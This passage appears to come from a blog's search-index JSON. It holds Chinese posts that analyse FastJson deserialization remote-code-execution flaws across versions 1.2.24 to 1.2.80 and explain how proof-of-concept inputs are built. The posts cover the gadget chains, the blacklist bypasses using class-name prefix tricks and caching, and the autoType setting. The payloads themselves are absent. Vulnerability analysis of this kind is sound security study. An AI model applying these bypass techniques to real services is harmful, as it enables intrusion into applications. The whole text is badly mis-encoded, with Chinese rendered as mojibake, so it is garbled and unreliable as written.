sqlæ³¨å…¥æœ¬è´¨ä¸Šä»ç„¶æ˜¯æœªè¿›è¡Œé¢„ç¼–è¯‘çš„ç›´æ¥æ‹¼æ¥å¯¼è‡´çš„ã€‚è¿˜æœ‰ä¸€äº›æ–‡ç« å°† wrapperè‡ªå®šä¹‰ sqlè¯­å¥å¯¼è‡´æ³¨å…¥ å’Œ ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œæ˜ å°„äº§ç”Ÿçš„æ³¨å…¥å•ç‹¬æ‹¿å‡ºæ¥è¯´ï¼Œæˆ‘è®¤ä¸ºæœ€ç»ˆè¿˜æ˜¯ä¼šå½’å’åˆ°ä¸Šé¢å‡ ç§æ³¨å…¥ä¸­ï¼Œæ‰€ä»¥ä¸è¿‡å¤šèµ˜è¿°äº†ã€‚"},{"title":"FastJsonååºåˆ—åŒ–RCEåˆ†æ","date":"2025-01-12T01:36:09.675Z","url":"/2025/01/12/FastJson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"å‰è¨€å½±å“ç‰ˆæœ¬ï¼šfastjson &lt;= 1.2.24æè¿°ï¼šfastjson é»˜è®¤ä½¿ç”¨ @type æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter&#x2F;setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚ fastjson &lt;&#x3D; 1.2.24 å­˜åœ¨ä¸¤æ¡åˆ©ç”¨é“¾ï¼š (1) jdbcRowSetImpl - JNDIæ³¨å…¥ (2) TemplatesImpl fastjson ååºåˆ—åŒ–æ—¶çš„ä¸€äº›è§„åˆ™è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson ååºåˆ—åŒ–æ—¶å¯¹å‡½æ•°æ–¹æ³•åå’Œå‚æ•°çš„ä¸€äº›è¦æ±‚ï¼š ä½¿ç”¨ JSON.parse(jsonString) å’Œ JSON.parseObject(jsonString, Target.class)ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– @type æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„ classã€‚ fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter&#x2F;setter æ–¹æ³•ï¼Œ å…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼š æ–¹æ³•åé•¿äº 4 ä¸æ˜¯é™æ€æ–¹æ³• ä»¥ get å¼€å¤´ä¸”ç¬¬ 4 ä½æ˜¯å¤§å†™å­—æ¯ æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ ç»§æ‰¿è‡ª Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼› setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼š æ–¹æ³•åé•¿äº 4 ä»¥ set å¼€å¤´ä¸”ç¬¬ 4 ä½æ˜¯å¤§å†™å­—æ¯ éé™æ€æ–¹æ³• è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±» å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ com.alibaba.fastjson.util.JavaBeanInfo.build() ä¸­ã€‚ FastJson &lt;&#x3D; 1.2.24jdbcRowSetImplé“¾ä½ç½®ï¼šcom.sun.rowset.JdbcRowSetImpl#setAutoCommit è·Ÿè¿› this.connect()æ–¹æ³•ï¼š this.connect()æ–¹æ³•ä¸­ä½¿ç”¨äº† lookup()æ–¹æ³•: dataSourceNameå€¼å¯æ§ï¼Œå­˜åœ¨JNDIæ³¨å…¥ï¼š POC åˆ©ç”¨åœºæ™¯ï¼š å…¶ä¸­ userè¾“å…¥ç”¨æˆ·å¯æ§ã€‚ TemplatesImplé“¾(æ¡ä»¶è‹›åˆ»)TemplatesImpl èµ·æº getteræ–¹æ³• getOutputProperties()ï¼Œè·Ÿè¿› newTransformer()ï¼š ç»§ç»­è·Ÿè¿› getTransletInstance()ï¼š å¯ä»¥çœ‹åˆ°å½“ _class çš„å€¼ä¸º nullæ—¶ä¼šè°ƒç”¨ defineTransletClasses()ï¼Œè·Ÿè¿› defineTransletClasses()ï¼š 1ã€æƒ³è¿›å…¥ try{}ä»£ç æ¨¡å—ã€‚_bytecodeså­—èŠ‚ç æ•°ç»„ä¸å¯ä»¥ä¸º nullã€‚ 2ã€åŠ è½½çš„ç±»çš„çˆ¶ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletï¼Œ_transletIndexé»˜è®¤å€¼ä¸º -1ï¼Œè‹¥åŠ è½½ç±»çˆ¶ç±»ä¸æ˜¯ AbstractTransletï¼Œå°±ä¼šæŠ¥é”™ã€‚ ç¬¦åˆæ¡ä»¶çš„ç±»åŠ è½½å®Œæˆåï¼Œåœ¨ getTransletInstance()ä¸­è¿›è¡Œå®ä¾‹åŒ–ï¼Œå®ä¾‹åŒ–æ—¶ä¼šæ‰§è¡Œ é™æ€åˆå§‹åŒ–å—çš„ä»£ç ï¼Œä»è€ŒRCEã€‚ POC(å‚è€ƒ Y4erå¸ˆå‚…) 1.2.25 &lt;&#x3D; FastJson &lt;&#x3D; 1.2.41ä½¿ç”¨ jdbcé“¾æ—¶æŠ¥é”™ï¼šautoType is not support. com.sun.rowset.jdbcRowSetImpl FastJson åœ¨ 1.2.25 ~ 1.2.41 ç‰ˆæœ¬ä¸­å¢åŠ äº† checkAutoType()ï¼Œåœ¨è·å– @typeçš„å€¼æ—¶å¯¹å…¶è¿›è¡Œæ£€æµ‹ï¼š è·Ÿè¿› com.alibaba.fastjson.parser.ParserConfig#checkAutoType autoTypeSupport å€¼é»˜è®¤ä¸º falseï¼Œä½¿ç”¨é»‘ç™½åå•è¿›è¡ŒéªŒè¯ï¼Œè‹¥å°† autoTypeSupportæœºåˆ¶å¼€å¯ï¼Œå³ autoTypeSupport &#x3D; trueï¼Œå³å¯æ— éœ€ç™½åå•æ£€æµ‹é€šè¿‡ï¼Œä¹Ÿå¯ä»¥åŠ è½½ç±»ï¼š ä½†ä¾ç„¶è¦ç»•è¿‡é»‘åå•æ£€æµ‹ï¼š å¯ä»¥ä½¿ç”¨ loadClass()çš„ç‰¹æ®Šå­—ç¬¦å»é™¤æœºåˆ¶è¿›è¡Œç»•è¿‡(é€»è¾‘æ¼æ´)ï¼š ç±»åå¼€å¤´ä¸º[ä¼šåœ¨ç±»åŠ è½½æ—¶å»é™¤ï¼Œä»¥ Lå¼€å¤´;ç»“å°¾ä¹Ÿä¼šåœ¨ç±»åŠ è½½æ—¶å»é™¤ã€‚ POC1ã€é¦–å…ˆæ˜¾ç¤ºçš„å¼€å¯ autoTypeSupportæœºåˆ¶ï¼š ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 2ã€ç‰¹æ®Šå­—ç¬¦ç»•è¿‡é»‘åå•æ£€æµ‹ï¼š æ³¨ï¼šé»‘åå•ç»•è¿‡æ˜¯åŸºäºParserConfig.getGlobalInstance().setAutoTypeSupport(true);çš„åŸºç¡€ä¹‹ä¸Šçš„ã€‚ FastJson 1.2.421.2.42 ç‰ˆæœ¬ä¸­çš„é»‘åå•é‡‡ç”¨äº† hashå€¼çš„å½¢å¼ã€‚ å¹¶ä¸”å¯¹ä¼ å…¥çš„ç±»è¿›è¡Œäº†ç‰¹æ®Šå­—ç¬¦å¤„ç†ï¼Œå¯¹å¼€å¤´çš„ L å’Œç»“å°¾çš„ ; è¿›è¡Œäº†ä¸€æ¬¡å»é™¤ï¼Œå¹¶é‡æ–°å°†åˆ é™¤åçš„ç»“æœèµ‹å€¼classNameã€‚ä½† loadClass()è¿›è¡Œçš„æ˜¯é€’å½’å¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥åŒå†™ç»•è¿‡ï¼š POC FastJson 1.2.43ä¿®å¤åŒå†™ç»•è¿‡ï¼Œè‹¥å‡ºç°ä¸¤ä¸ª Lå­—ç¬¦å¼€å¤´åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼š ä½†æ˜¯ [ å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä½¿ç”¨ [ç»•è¿‡å³å¯ã€‚ POC FastJson 1.2.44ä¿®å¤äº† 1.2.43ä¸­ [å­—ç¬¦ç»•è¿‡çš„é—®é¢˜ã€‚ FastJson 1.2.45é»‘åå•ç»•è¿‡ã€‚ POC FastJson 1.2.47 (é‡è¦)POC FastJson 1.2.47 æ˜¯æœ€ä¸ºä¸¥é‡çš„ä¸€ä¸ªæ¼æ´ã€‚å¯ä»¥åœ¨ä¸å¼€å¯ autoTypeSupportçš„æ¡ä»¶ä¸‹å®ç°RCEã€‚ com.alibaba.fastjson.util.TypeUtilsçš„é™æ€ä»£ç å—åˆå§‹åŒ–è°ƒç”¨ com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings å°†å¸¸ç”¨çš„ç±»é€šè¿‡ loadClass()æ”¾åˆ° mappingsä¸­ï¼š ä½¿ç”¨ POCè¿›è¡Œè°ƒè¯•ï¼š ç»§ç»­è·Ÿè¿›åˆ° checkAutoType()ä¸­ï¼Œä»£ç ä½¿ç”¨ Mapping å’Œä½¿ç”¨ deserializers.findClass() æŸ¥æ‰¾ Java.lang.Classï¼š æ‰¾åˆ°åèµ‹å€¼ç»™ clazzï¼š clazzæœ‰å€¼åï¼Œç›´æ¥è¿”å›äº†ï¼Œæ— éœ€ç»è¿‡é»‘ç™½åå•æ£€æµ‹ï¼š ä» checkAutoType()å‡ºæ¥åï¼Œè·Ÿè¿› deserialize()ï¼š Parser.parse()è·å–åˆ° objValçš„å€¼ï¼š è¿›è€Œèµ‹å€¼ç»™ strVal: ç»è¿‡ä¸€ç³»åˆ— ifåˆ¤æ–­ï¼Œå› ä¸º clazz ä¸º java.lang.Class &#x3D;&#x3D; Class.classï¼Œæ‰€ä»¥ strValä½œä¸ºå‚æ•°è¢« TypeUtils.loadClass()è°ƒç”¨ï¼Œè·Ÿè¿› TypeUtils.loadClass()ï¼š ç»§ç»­è·Ÿè¿› loadClass()ï¼Œå¯ä»¥çœ‹åˆ° cacheå‚æ•°é»˜è®¤ä¸º trueï¼š å°† com.sun.rowset.JdbcRowSetImplç±»åŠ å…¥åˆ°äº† mappingä¸­ã€‚è¿™æ ·åœ¨è§£æç¬¬äºŒç»„é”®å€¼å¯¹æ—¶ï¼Œå¯ä»¥åœ¨ mappingä¸­æ‰¾åˆ° JdbcRowSetImplç±»ä»è€Œç›´æ¥ return classï¼Œæ— éœ€é»‘ç™½åå•æ£€æµ‹ï¼Œå®ç°RCEã€‚ FastJson 1.2.48é’ˆå¯¹ 1.2.47è¿›è¡Œäº†ä¿®å¤ï¼Œå°† cacheçš„é»˜è®¤å€¼ä» trueä¿®æ”¹ä¸ºäº† falseï¼š FastJson 1.2.62å‰æï¼šautoTypeSupport ä¸º true POC FastJson 1.2.66å‰æï¼šautoTypeSupport ä¸º true POC FastJson 1.2.68FastJson 1.2.68ç‰ˆæœ¬å¼•å…¥äº†å®‰å…¨æ¨¡å¼ safeModeï¼Œå¦‚æœå¼€å¯äº†å®‰å…¨æ¨¡å¼ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¸€åŠ³æ°¸é€¸ï¼š è¿™ä¸ªç‰ˆæœ¬æœ‰ä¸¤ä¸ªRCEï¼š ThrowableDeserializer.deserialze() å’Œ JavaBeanDeserializer.deserialze() ä½†æ˜¯ ThrowableDeserializer.deserialze() å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¾ˆå°‘æœ‰å¼€å‘å¾€å¼‚å¸¸ç±»ä¸­å»å†™å‘½ä»¤æ‰§è¡Œã€‚ POC1 (Throwable) è°ƒè¯• è·å– Java.lang.Exceptionçš„ååºåˆ—åŒ–å™¨æ—¶ï¼Œè·Ÿè¿› getDeserializer()æ–¹æ³•ï¼š å› ä¸º Throwableæ˜¯ Exceptionç±»çš„çˆ¶ç±»ï¼Œæ•…ä½¿ç”¨ ThrowableDeserializeræ¥è·å–ååºåˆ—åŒ–å™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ createJavaBeanDeserializer()ï¼š ç»§ç»­è·Ÿè¿› deserializer.deserialze()ï¼š å¯ä»¥çœ‹åˆ°æ­¤æ—¶ checkAutoType()ä¸­çš„ exClassNameå€¼ä¸º Throwable.classï¼Œè·Ÿè¿› checkAutoType()ï¼š ç¬¦åˆ expectClass.isAssignableFrom(clazz)çš„æ¡ä»¶ï¼Œreturn clazzï¼Œé€šè¿‡ checkAutoTypeæ£€æµ‹ï¼Œåç»­é€šè¿‡è°ƒç”¨ getterï¼Œsetteræ–¹æ³•å¼•å‘RCEã€‚ POC2 (AutoCloseable) è¿‡ç¨‹åŒç†ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚ FastJson 1.2.80å›é¡¾ FastJson 1.2.68ç‰ˆæœ¬çš„æ¼æ´ï¼Œåˆ©ç”¨ ThrowableDeserializerå’Œ JavaBeanDeserializeråœ¨è°ƒç”¨ checkAutoTypeæ—¶ç¬¬äºŒä¸ªå‚æ•° exceptClassæœŸæœ›ç±»ä¸ä¸ºç©ºå®ç°RCEï¼Œä½†æ˜¯å“ªä¸ªå¼€å‘å¾€å¼‚å¸¸ç±»é‡Œå†™å‘½ä»¤æ‰§è¡Œå‡½æ•°å‘¢ï¼Œæ‰€ä»¥è¿™ä¸ªç‰ˆæœ¬æ¼æ´çš„æ”»å‡»é¢å¾ˆå°ï¼Œæ‰€ä»¥å®˜ç½‘å¹¶æœªå¯¹è¿™ä¸ªç»•è¿‡è¿›è¡Œä¿®å¤ï¼Œè€Œæ˜¯æŠŠå‡ ä¸ªå¯èƒ½è¢«åˆ©ç”¨çš„ç±»åŠ å…¥äº†é»‘åå•ï¼Œä¸º FastJson 1.2.80ç‰ˆæœ¬çš„RCEåŸ‹ä¸‹ä¼ç¬”ã€‚ å‚è€ƒ Y4erå¸ˆå‚…çš„ä»£ç ï¼Œæ„é€ ä¸€ä¸ª Jsonè§£é‡ŠåŸç†ï¼š Json_poc: æ‰“æ–­ç‚¹è°ƒè¯•ï¼ŒåŒ FastJson_1.2.68ï¼Œä½¿ç”¨ååºåˆ—åŒ–å™¨ ThrowableDeserializerï¼Œè·Ÿè¿› ThrowableDeserializer.deserialze()ï¼š ä¾æ—§åŒ FastJson_1.2.68ï¼Œè·å–ç¬¬äºŒä¸ª @typeä¸­çš„å€¼ com.xxxx.fastjson_demo.run.MyExceptionï¼Œå¹¶åˆ›å»ºå®ƒçš„å¼‚å¸¸å®ä¾‹ï¼š ç»§ç»­è·Ÿè¿›ï¼Œè‹¥è¿˜æœ‰å‰©ä½™é”®å€¼å¯¹æœªè¿›è¡Œååºåˆ—åŒ– (è¿™é‡Œå‰©ä½™ â€œclazzâ€:{})ï¼Œä¼šç»§ç»­è·å– exClassçš„ååºåˆ—åŒ–å™¨ï¼š ç»§ç»­è·Ÿè¿›ï¼Œå¦‚æœ valueä¸æ˜¯ fieldInfo.fieldClassç±»å‹åˆ™ä¼šè¿›å…¥ TypeUtils.cast()ä¸­ï¼Œè¿™é‡Œ fieldInfo.fieldClass æ˜¯ com.xxxx.fastjson_demo.run.MyExceptionï¼Œvalue &#x3D; {}æ˜¾ç„¶ç±»å‹ä¸åŒï¼Œè·Ÿè¿› TypeUtils.cast()ï¼š ç»§ç»­è·Ÿè¿›ï¼š ç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­ï¼Œå› ä¸º obj &#x3D; value &#x3D; {}ï¼Œ{}è¡¨ç¤ºç©ºçš„ JSONå¯¹è±¡ï¼Œ{} instancef Mapæ˜¯æ­£ç¡®çš„ï¼Œç»§ç»­è·Ÿè¿› castToJavaBean()ï¼š è·Ÿè¿› getDeserializer()æ–¹æ³•ï¼š ç»§ç»­è·Ÿè¿›ï¼š æœ€åè°ƒç”¨ putDeserializer()æ–¹æ³•ï¼Œå°† com.xxxx.fastjson_demo.run.MyClassç±»åŠ å…¥åˆ° deserializeråå•ä¸­ è¿™æ ·å°±å¯ä»¥åœ¨ååºåˆ—åŒ– Jsonä¸­çš„ â€œbâ€çš„å†…å®¹æ—¶ï¼Œé€šè¿‡ checkAutoTypeæ£€æµ‹ï¼Œå®ç°RCEã€‚ POC(1) Groovy: (å‚è€ƒ ) ä¿®å¤ï¼šç›´æ¥å¹²æ‰äº†å¼‚å¸¸ç±» å‚è€ƒæ–‡ç« ï¼š(1)  (2)  (3)  (4)  (5) "},{"title":"FastJsonæ¼æ´POCçš„æ„é€ é€»è¾‘","date":"2025-01-11T13:12:50.815Z","url":"/2025/01/11/FastJson%E6%BC%8F%E6%B4%9E%20POC%E7%9A%84%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"FastJsonçš„è°ƒç”¨é€»è¾‘ (æ ¹æ®ä»£ç æ‰§è¡Œç»“æœåˆ†æ)Fastjsonæ¼æ´äº§ç”Ÿåœ¨å°† JSONå­—ç¬¦ä¸² ååºåˆ—åŒ–ä¸º JavaBeançš„è¿‡ç¨‹ä¸­ã€‚ è¿™æ˜¯ä¸€æ®µä½¿ç”¨ parseObject()æ–¹æ³•å°† JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–çš„ä»£ç ï¼š Userç±»ï¼š JSONUserç±»ï¼š å¯ä»¥çœ‹åˆ° JSONå­—ç¬¦ä¸²ä¸­çš„ â€œstudentNameâ€ : â€œadminâ€ï¼Œè€Œä¸æ˜¯ â€œnameâ€ : â€œadminâ€ï¼Œæ˜¯å› ä¸ºè¦å‘ setStudentNameçœ‹é½ï¼š â€œstudentNameâ€ è¿è¡Œç»“æœ -&gt; setStudentName()æ–¹æ³•è¢«è°ƒç”¨ â€œnameâ€ è¿è¡Œç»“æœ -&gt; setStudentName()æ–¹æ³•æœªè¢«è°ƒç”¨ è¿™ä¸ªä¾‹å­ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆ Fastjson 1.2.24 - JdbcRowSetImplé“¾ POCä¸­ éœ€è¦ç»™ autoCommitå‚æ•°å•ç‹¬èµ‹å€¼(trueå’Œ falseéƒ½è¡Œ)ï¼ŒåŸå› å°±æ˜¯ä¸èµ‹å€¼è°ƒç”¨ä¸äº† setAutoCommitæ–¹æ³•ã€‚"}]